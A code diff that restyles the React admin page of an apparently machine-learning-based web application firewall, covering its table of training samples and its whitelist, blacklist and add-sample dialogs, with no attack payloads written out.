-                style={{ padding: '7px 14px', borderRadius: '8px', background: '#7c3aed', color: 'white', border: 'none', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '6px' }}
+                style={{ padding: '6px 12px', borderRadius: '6px', background: '#2563EB', color: '#FFFFFF', border: 'none', fontSize: '12px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
               >
-                <i className={`fas fa-rotate ${retraining ? 'fa-spin' : ''}`}></i> Retrain Model
+                <RotateCw size={13} className={retraining ? 'animate-spin' : ''} />
+                <span>Retrain Model</span>
               </button>
             </div>
           </div>
 
           {/* Samples Table */}
           {samplesLoading ? (
-            <div style={{ textAlign: 'center', padding: '50px', color: '#94a3b8' }}>
-              <i className="fas fa-spinner fa-spin fa-2x"></i>
-              <p style={{ marginTop: '10px', fontSize: '13px' }}>Loading dataset samples...</p>
+            <div style={{ textAlign: 'center', padding: '50px', color: '#94A3B8' }}>
+              <RotateCw size={24} className="animate-spin" style={{ margin: '0 auto 8px', display: 'block' }} />
+              <p style={{ margin: 0, fontSize: '13px' }}>Loading dataset samples...</p>
             </div>
           ) : samples.length === 0 ? (
-            <div style={{ textAlign: 'center', padding: '50px 20px', background: '#f8fafc', borderRadius: '10px', border: '1px dashed #cbd5e1' }}>
-              <h3 style={{ margin: '0 0 6px', color: '#0f172a', fontSize: '16px' }}>No Training Samples Found</h3>
-              <p style={{ color: '#64748b', fontSize: '13px', margin: 0 }}>Whitelist normal requests or blacklist new attacks to grow your active ML model dataset.</p>
+            <div style={{ textAlign: 'center', padding: '50px 20px', color: '#64748B' }}>
+              <Database size={32} style={{ color: '#94A3B8', margin: '0 auto 8px', display: 'block' }} />
+              <h3 style={{ margin: '0 0 4px', color: '#0F172A', fontSize: '15px' }}>No Training Samples Found</h3>
+              <p style={{ color: '#64748B', fontSize: '12px', margin: 0 }}>Whitelist normal requests or blacklist attacks to grow your active ML model dataset.</p>
             </div>
           ) : (
-            <div style={{ overflowX: 'auto' }}>
-              <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
+            <div style={{ overflowX: 'auto', WebkitOverflowScrolling: 'touch' }}>
+              <table style={{ width: '100%', minWidth: '780px', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
                 <thead>
-                  <tr style={{ background: '#f8fafc', borderBottom: '1px solid #e2e8f0', color: '#475569', fontSize: '12px', textTransform: 'uppercase' }}>
-                    <th style={{ padding: '12px 16px' }}>Classification</th>
-                    <th style={{ padding: '12px 16px' }}>Category</th>
-                    <th style={{ padding: '12px 16px' }}>Payload Sample</th>
-                    <th style={{ padding: '12px 16px' }}>Source</th>
-                    <th style={{ padding: '12px 16px' }}>Status</th>
-                    <th style={{ padding: '12px 16px', textAlign: 'right' }}>Action</th>
+                  <tr style={{ background: '#FBFCFA', borderBottom: '1px solid #D9E1DC', color: '#60716B', fontSize: '11px', textTransform: 'uppercase', letterSpacing: '0.04em', fontWeight: '700' }}>
+                    <th style={{ padding: '14px 16px' }}>Classification</th>
+                    <th style={{ padding: '14px 16px' }}>Category</th>
+                    <th style={{ padding: '14px 16px' }}>Payload Sample</th>
+                    <th style={{ padding: '14px 16px' }}>Source</th>
+                    <th style={{ padding: '14px 16px' }}>Status</th>
+                    <th style={{ padding: '14px 16px', textAlign: 'right' }}>Action</th>
                   </tr>
                 </thead>
                 <tbody>
                   {samples.map(sm => (
-                    <tr key={sm.id} style={{ borderBottom: '1px solid #f1f5f9' }}>
-                      <td style={{ padding: '12px 16px' }}>
+                    <tr
+                      key={sm.id}
+                      style={{ borderBottom: '1px solid #F1F5F9', transition: 'background-color 0.15s ease' }}
+                      onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#F8FAFC'}
+                      onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FFFFFF'}
+                    >
+                      <td style={{ padding: '14px 16px', verticalAlign: 'middle' }}>
                         <span style={{
                           padding: '3px 8px',
                           borderRadius: '12px',
                           fontSize: '11px',
                           fontWeight: '700',
-                          background: sm.label === 1 ? '#fee2e2' : '#dcfce7',
-                          color: sm.label === 1 ? '#dc2626' : '#16a34a'
+                          background: sm.label === 1 ? '#FEF2F2' : '#ECFDF5',
+                          color: sm.label === 1 ? '#DC2626' : '#059669',
+                          border: '1px solid ' + (sm.label === 1 ? '#FECACA' : '#A7F3D0')
                         }}>
                           {sm.label === 1 ? 'Attack Threat (1)' : 'Benign Safe (0)'}
                         </span>
                       </td>
-                      <td style={{ padding: '12px 16px', fontWeight: '600', color: '#0f172a' }}>{sm.category}</td>
-                      <td style={{ padding: '12px 16px', fontFamily: 'monospace', maxWidth: '380px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', color: '#0369a1' }}>
-                        {sm.payload}
+                      <td style={{ padding: '14px 16px', fontWeight: '700', color: '#0F172A', verticalAlign: 'middle', fontSize: '12.5px' }}>{sm.category}</td>
+                      <td style={{ padding: '14px 16px', verticalAlign: 'middle' }}>
+                        <div style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', background: '#F8FAFC', padding: '3px 8px', borderRadius: '6px', border: '1px solid #D9E1DC', maxWidth: '340px' }}>
+                          <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: '11px', color: '#0369A1', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                            {sm.payload}
+                          </span>
+                          <button
+                            type="button"
+                            onClick={() => handleCopy(sm.id, sm.payload)}
+                            title="Copy payload"
+                            style={{ background: 'transparent', border: 'none', cursor: 'pointer', color: '#64748B', display: 'flex' }}
+                          >
+                            {copiedId === sm.id ? <Check size={11} style={{ color: '#059669' }} /> : <Copy size={11} />}
+                          </button>
+                        </div>
                       </td>
-                      <td style={{ padding: '12px 16px', color: '#64748b' }}>{sm.source}</td>
-                      <td style={{ padding: '12px 16px' }}>
+                      <td style={{ padding: '14px 16px', color: '#64748B', verticalAlign: 'middle', fontSize: '12px' }}>{sm.source}</td>
+                      <td style={{ padding: '14px 16px', verticalAlign: 'middle' }}>
                         {sm.trained ? (
-                          <span style={{ color: '#16a34a', fontSize: '12px', fontWeight: '600' }}><i className="fas fa-check"></i> Trained</span>
+                          <span style={{ color: '#059669', fontSize: '11.5px', fontWeight: '700', display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
+                            <CheckCircle2 size={13} /> Trained
+                          </span>
                         ) : (
-                          <span style={{ color: '#d97706', fontSize: '12px', fontWeight: '600' }}><i className="fas fa-clock"></i> Queued</span>
+                          <span style={{ color: '#D97706', fontSize: '11.5px', fontWeight: '700', display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
+                            <Clock size={13} /> Queued
+                          </span>
                         )}
                       </td>
-                      <td style={{ padding: '12px 16px', textAlign: 'right' }}>
+                      <td style={{ padding: '14px 16px', textAlign: 'right', verticalAlign: 'middle' }}>
                         <button
                           onClick={() => handleDeleteSample(sm.id)}
-                          style={{ padding: '4px 8px', borderRadius: '6px', background: '#fee2e2', border: '1px solid #fca5a5', color: '#dc2626', fontSize: '12px', cursor: 'pointer' }}
+                          style={{ background: 'transparent', border: 'none', color: '#94A3B8', cursor: 'pointer', padding: '4px' }}
+                          onMouseEnter={(e) => e.currentTarget.style.color = '#DC2626'}
+                          onMouseLeave={(e) => e.currentTarget.style.color = '#94A3B8'}
                         >
-                          <i className="fas fa-trash"></i>
-                        </button>
-                      </td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
-            </div>
-          )}
-        </div>
-      )}
-
-      {/* ==================== TAB 4: WHITELISTS ==================== */}
-      {activeTab === 'whitelists' && (
-        <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
-          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
-            <div>
-              <h3 style={{ margin: '0 0 4px', fontSize: '16px', color: '#0f172a' }}>Active Whitelist Exception Rules</h3>
-              <p style={{ color: '#64748b', fontSize: '12.5px', margin: 0 }}>Matching paths or substrings will completely bypass WAF blocking and prevent 403 errors.</p>
-            </div>
-            <button
-              onClick={() => handleOpenWhitelistModal()}
-              style={{ padding: '7px 14px', borderRadius: '8px', background: '#16a34a', color: 'white', border: 'none', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '6px' }}
-            >
-              <i className="fas fa-plus"></i> Add Whitelist Rule
-            </button>
-          </div>
-
-          {whitelistsLoading ? (
-            <div style={{ textAlign: 'center', padding: '50px', color: '#94a3b8' }}>
-              <i className="fas fa-spinner fa-spin fa-2x"></i>
-              <p style={{ marginTop: '10px', fontSize: '13px' }}>Loading whitelists...</p>
-            </div>
-          ) : whitelists.length === 0 ? (
-            <div style={{ textAlign: 'center', padding: '50px 20px', background: '#f8fafc', borderRadius: '10px', border: '1px dashed #cbd5e1' }}>
-              <h3 style={{ margin: '0 0 6px', color: '#0f172a', fontSize: '16px' }}>No Whitelist Rules Defined</h3>
-              <p style={{ color: '#64748b', fontSize: '13px', margin: 0 }}>Add whitelist rules when users report 403 false positives.</p>
-            </div>
-          ) : (
-            <div style={{ overflowX: 'auto' }}>
-              <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
-                <thead>
-                  <tr style={{ background: '#f8fafc', borderBottom: '1px solid #e2e8f0', color: '#475569', fontSize: '12px', textTransform: 'uppercase' }}>
-                    <th style={{ padding: '12px 16px' }}>Rule Name</th>
-                    <th style={{ padding: '12px 16px' }}>Match Type</th>
-                    <th style={{ padding: '12px 16px' }}>Pattern / Path</th>
-                    <th style={{ padding: '12px 16px' }}>Description</th>
-                    <th style={{ padding: '12px 16px', textAlign: 'right' }}>Action</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {whitelists.map(wl => (
-                    <tr key={wl.id} style={{ borderBottom: '1px solid #f1f5f9' }}>
-                      <td style={{ padding: '12px 16px', fontWeight: '700', color: '#0f172a' }}>{wl.name}</td>
-                      <td style={{ padding: '12px 16px' }}>
-                        <code style={{ background: '#dcfce7', color: '#16a34a', padding: '2px 6px', borderRadius: '4px', fontWeight: '600' }}>
-                          {wl.match_type}
-                        </code>
-                      </td>
-                      <td style={{ padding: '12px 16px', fontFamily: 'monospace', color: '#0284c7' }}>{wl.pattern}</td>
-                      <td style={{ padding: '12px 16px', color: '#64748b' }}>{wl.description}</td>
-                      <td style={{ padding: '12px 16px', textAlign: 'right' }}>
-                        <button
-                          onClick={() => handleDeleteWhitelist(wl.id)}
-                          style={{ padding: '4px 8px', borderRadius: '6px', background: '#fee2e2', border: '1px solid #fca5a5', color: '#dc2626', fontSize: '12px', cursor: 'pointer' }}
-                        >
-                          <i className="fas fa-trash"></i>
+                          <Trash2 size={14} />
                         </button>
                       </td>
                     </tr>
@@ -1052,45 +1240,42 @@ export default function AttackLearning() {
       {whitelistModalOpen && (
         <div style={{
           position: 'fixed',
-          top: 0,
-          left: 0,
-          right: 0,
-          bottom: 0,
-          background: 'rgba(15, 23, 42, 0.6)',
+          inset: 0,
+          background: 'rgba(15, 23, 42, 0.5)',
           display: 'flex',
           alignItems: 'center',
           justifyContent: 'center',
           zIndex: 9999,
           padding: '20px'
         }}>
-          <div style={{ background: 'white', borderRadius: '14px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.2)', overflow: 'hidden' }}>
-            <div style={{ padding: '16px 20px', borderBottom: '1px solid #e2e8f0', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#f8fafc' }}>
-              <h3 style={{ margin: 0, fontSize: '15px', color: '#16a34a', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
-                <i className="fas fa-shield-heart"></i> Whitelist Request Pattern (Fix 403)
+          <div style={{ background: '#FFFFFF', borderRadius: '12px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.15)', overflow: 'hidden' }}>
+            <div style={{ padding: '16px 20px', borderBottom: '1px solid #D9E1DC', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#FBFCFA' }}>
+              <h3 style={{ margin: 0, fontSize: '15px', color: '#059669', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <ShieldCheck size={18} /> Whitelist Request Pattern (Fix 403)
               </h3>
-              <button onClick={() => setWhitelistModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: '16px', cursor: 'pointer' }}>
-                <i className="fas fa-times"></i>
+              <button onClick={() => setWhitelistModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94A3B8', cursor: 'pointer' }}>
+                <X size={18} />
               </button>
             </div>
 
             <form onSubmit={handleWhitelistSubmit} style={{ padding: '20px' }}>
-              <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Rule Name</label>
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Rule Name</label>
                 <input
                   type="text"
                   required
                   value={whitelistForm.name}
                   onChange={e => setWhitelistForm({ ...whitelistForm, name: e.target.value })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', boxSizing: 'border-box' }}
                 />
               </div>
 
-              <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Match Type</label>
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Match Type</label>
                 <select
                   value={whitelistForm.match_type}
                   onChange={e => setWhitelistForm({ ...whitelistForm, match_type: e.target.value })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', background: 'white' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', background: '#FFFFFF', boxSizing: 'border-box' }}
                 >
                   <option value="contains">Contains Substring</option>
                   <option value="url_path">URL Path Prefix</option>
@@ -1099,33 +1284,33 @@ export default function AttackLearning() {
                 </select>
               </div>
 
-              <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Pattern to Whitelist</label>
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Pattern to Whitelist</label>
                 <input
                   type="text"
                   required
                   value={whitelistForm.pattern}
                   onChange={e => setWhitelistForm({ ...whitelistForm, pattern: e.target.value })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', fontFamily: 'monospace' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                 />
               </div>
 
               <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Description / Note</label>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Description / Note</label>
                 <input
                   type="text"
                   value={whitelistForm.description}
                   onChange={e => setWhitelistForm({ ...whitelistForm, description: e.target.value })}
-                  placeholder="e.g. Legitimate admin payment webhook"
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
+                  placeholder="e.g. Legitimate payment webhook callback"
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', boxSizing: 'border-box' }}
                 />
               </div>
 
-              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '20px' }}>
-                <button type="button" onClick={() => setWhitelistModalOpen(false)} style={{ padding: '8px 16px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', color: '#64748b', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
+              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '8px', marginTop: '16px' }}>
+                <button type="button" onClick={() => setWhitelistModalOpen(false)} style={{ padding: '7px 14px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#64748B', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer' }}>
                   Cancel
                 </button>
-                <button type="submit" style={{ padding: '8px 18px', borderRadius: '8px', background: '#16a34a', color: 'white', border: 'none', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
+                <button type="submit" style={{ padding: '7px 16px', borderRadius: '6px', background: '#059669', color: '#FFFFFF', border: 'none', fontSize: '12.5px', fontWeight: '700', cursor: 'pointer' }}>
                   Apply Whitelist
                 </button>
               </div>
@@ -1138,45 +1323,42 @@ export default function AttackLearning() {
       {blacklistModalOpen && (
         <div style={{
           position: 'fixed',
-          top: 0,
-          left: 0,
-          right: 0,
-          bottom: 0,
-          background: 'rgba(15, 23, 42, 0.6)',
+          inset: 0,
+          background: 'rgba(15, 23, 42, 0.5)',
           display: 'flex',
           alignItems: 'center',
           justifyContent: 'center',
           zIndex: 9999,
           padding: '20px'
         }}>
-          <div style={{ background: 'white', borderRadius: '14px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.2)', overflow: 'hidden' }}>
-            <div style={{ padding: '16px 20px', borderBottom: '1px solid #e2e8f0', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#f8fafc' }}>
-              <h3 style={{ margin: 0, fontSize: '15px', color: '#dc2626', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
-                <i className="fas fa-ban"></i> Blacklist & Train ML Model
+          <div style={{ background: '#FFFFFF', borderRadius: '12px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.15)', overflow: 'hidden' }}>
+            <div style={{ padding: '16px 20px', borderBottom: '1px solid #D9E1DC', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#FBFCFA' }}>
+              <h3 style={{ margin: 0, fontSize: '15px', color: '#DC2626', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <ShieldAlert size={18} /> Blacklist &amp; Train ML Model
               </h3>
-              <button onClick={() => setBlacklistModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: '16px', cursor: 'pointer' }}>
-                <i className="fas fa-times"></i>
+              <button onClick={() => setBlacklistModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94A3B8', cursor: 'pointer' }}>
+                <X size={18} />
               </button>
             </div>
 
             <form onSubmit={handleBlacklistSubmit} style={{ padding: '20px' }}>
-              <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Rule Identifier</label>
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Rule Identifier</label>
                 <input
                   type="text"
                   required
                   value={blacklistForm.name}
                   onChange={e => setBlacklistForm({ ...blacklistForm, name: e.target.value })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                 />
               </div>
 
-              <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Attack Category</label>
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Attack Category</label>
                 <select
                   value={blacklistForm.category}
                   onChange={e => setBlacklistForm({ ...blacklistForm, category: e.target.value })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', background: 'white' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', background: '#FFFFFF', boxSizing: 'border-box' }}
                 >
                   <option value="SQL Injection">SQL Injection</option>
                   <option value="XSS">XSS (Cross-Site Scripting)</option>
@@ -1187,22 +1369,22 @@ export default function AttackLearning() {
               </div>
 
               <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Payload Signature to Block & Learn</label>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Payload Signature to Block &amp; Learn</label>
                 <input
                   type="text"
                   required
                   value={blacklistForm.pattern}
                   onChange={e => setBlacklistForm({ ...blacklistForm, pattern: e.target.value })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', fontFamily: 'monospace' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                 />
               </div>
 
-              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '20px' }}>
-                <button type="button" onClick={() => setBlacklistModalOpen(false)} style={{ padding: '8px 16px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', color: '#64748b', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
+              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '8px', marginTop: '16px' }}>
+                <button type="button" onClick={() => setBlacklistModalOpen(false)} style={{ padding: '7px 14px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#64748B', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer' }}>
                   Cancel
                 </button>
-                <button type="submit" style={{ padding: '8px 18px', borderRadius: '8px', background: '#dc2626', color: 'white', border: 'none', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
-                  Blacklist & Train ML
+                <button type="submit" style={{ padding: '7px 16px', borderRadius: '6px', background: '#DC2626', color: '#FFFFFF', border: 'none', fontSize: '12.5px', fontWeight: '700', cursor: 'pointer' }}>
+                  Blacklist &amp; Train ML
                 </button>
               </div>
             </form>
@@ -1214,66 +1396,63 @@ export default function AttackLearning() {
       {addSampleModalOpen && (
         <div style={{
           position: 'fixed',
-          top: 0,
-          left: 0,
-          right: 0,
-          bottom: 0,
-          background: 'rgba(15, 23, 42, 0.6)',
+          inset: 0,
+          background: 'rgba(15, 23, 42, 0.5)',
           display: 'flex',
           alignItems: 'center',
           justifyContent: 'center',
           zIndex: 9999,
           padding: '20px'
         }}>
-          <div style={{ background: 'white', borderRadius: '14px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.2)', overflow: 'hidden' }}>
-            <div style={{ padding: '16px 20px', borderBottom: '1px solid #e2e8f0', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#f8fafc' }}>
-              <h3 style={{ margin: 0, fontSize: '15px', color: '#7c3aed', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
-                <i className="fas fa-plus"></i> Add Sample to ML Dataset
+          <div style={{ background: '#FFFFFF', borderRadius: '12px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.15)', overflow: 'hidden' }}>
+            <div style={{ padding: '16px 20px', borderBottom: '1px solid #D9E1DC', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#FBFCFA' }}>
+              <h3 style={{ margin: 0, fontSize: '15px', color: '#2563EB', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <Plus size={18} /> Add Sample to ML Dataset
               </h3>
-              <button onClick={() => setAddSampleModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: '16px', cursor: 'pointer' }}>
-                <i className="fas fa-times"></i>
+              <button onClick={() => setAddSampleModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94A3B8', cursor: 'pointer' }}>
+                <X size={18} />
               </button>
             </div>
 
             <form onSubmit={handleAddSampleSubmit} style={{ padding: '20px' }}>
-              <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Sample Type</label>
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Sample Type</label>
                 <select
                   value={sampleForm.label}
                   onChange={e => setSampleForm({ ...sampleForm, label: Number(e.target.value) })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', background: 'white' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', background: '#FFFFFF', boxSizing: 'border-box' }}
                 >
                   <option value={1}>Malicious Attack Sample (Label = 1: Should Block 403)</option>
                   <option value={0}>Benign Legitimate Sample (Label = 0: Should Allow 200)</option>
                 </select>
               </div>
 
-              <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Category</label>
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Category</label>
                 <input
                   type="text"
                   value={sampleForm.category}
                   onChange={e => setSampleForm({ ...sampleForm, category: e.target.value })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', boxSizing: 'border-box' }}
                 />
               </div>
 
               <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Raw Payload Sample</label>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Raw Payload Sample</label>
                 <textarea
                   rows={4}
                   required
                   value={sampleForm.payload}
                   onChange={e => setSampleForm({ ...sampleForm, payload: e.target.value })}
-                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', fontFamily: 'monospace' }}
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                 />
               </div>
 
-              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '20px' }}>
-                <button type="button" onClick={() => setAddSampleModalOpen(false)} style={{ padding: '8px 16px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', color: '#64748b', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
+              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '8px', marginTop: '16px' }}>
+                <button type="button" onClick={() => setAddSampleModalOpen(false)} style={{ padding: '7px 14px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#64748B', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer' }}>
                   Cancel
                 </button>
-                <button type="submit" style={{ padding: '8px 18px', borderRadius: '8px', background: '#7c3aed', color: 'white', border: 'none', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
+                <button type="submit" style={{ padding: '7px 16px', borderRadius: '6px', background: '#2563EB', color: '#FFFFFF', border: 'none', fontSize: '12.5px', fontWeight: '700', cursor: 'pointer' }}>
                   Add to Dataset
                 </button>
               </div>
@@ -1281,6 +1460,6 @@ export default function AttackLearning() {
           </div>
         </div>
       )}
-    </>
+    </div>
   )
 }
